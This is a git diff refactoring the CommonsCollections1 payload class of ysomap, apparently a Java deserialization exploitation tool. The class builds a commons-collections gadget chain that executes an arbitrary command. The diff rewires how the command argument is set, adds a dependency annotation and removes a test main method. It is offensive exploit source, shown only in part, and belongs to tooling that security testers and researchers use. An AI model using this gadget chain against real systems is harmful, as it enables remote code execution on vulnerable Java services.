@@ -4,10 +4,9 @@ import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.map.LazyMap;
-import ysomap.exception.GenerateErrorException;
-import ysomap.runner.PayloadTester;
 import ysomap.annotation.Authors;
 import ysomap.annotation.Dependencies;
+import ysomap.annotation.Require;
 import ysomap.gadget.ObjectGadget;
 import ysomap.gadget.bullet.collections.TransformerWithTemplatesImplBullet;
 import ysomap.gadget.payload.Payload;
@@ -27,6 +26,7 @@ import java.util.Map;
  */
 @SuppressWarnings({"rawtypes","unchecked"})
 @Authors({ Authors.FROHOFF })
+@Require(bullets = {"TransformerBullet","TransformerWithTemplatesImplBullet","TransformerWithResponseBullet"})
 @Dependencies({"commons-collections:commons-collections:3.2.1","jdk7"})
 public class CommonsCollections1 extends Payload<InvocationHandler> {
 
@@ -59,15 +59,8 @@ public class CommonsCollections1 extends Payload<InvocationHandler> {
     }
 
     @Override
-    public ObjectGadget getDefaultBullet(String command) {
-        return new TransformerWithTemplatesImplBullet(command,"3");
+    public ObjectGadget getDefaultBullet(String command) throws Exception {
+        return new TransformerWithTemplatesImplBullet().set("args",command);
     }
 
-    public static void main(String[] args) throws GenerateErrorException {
-        ObjectGadget bullet = new TransformerWithTemplatesImplBullet(null,"3");
-//        new PayloadTester(CommonsCollections1.class).run();//ysoserial CommonsCollections1
-        new PayloadTester(CommonsCollections1.class)// ysoserial CommonsCollections3
-                .setBullet(bullet)
-                .run();
-    }
 }
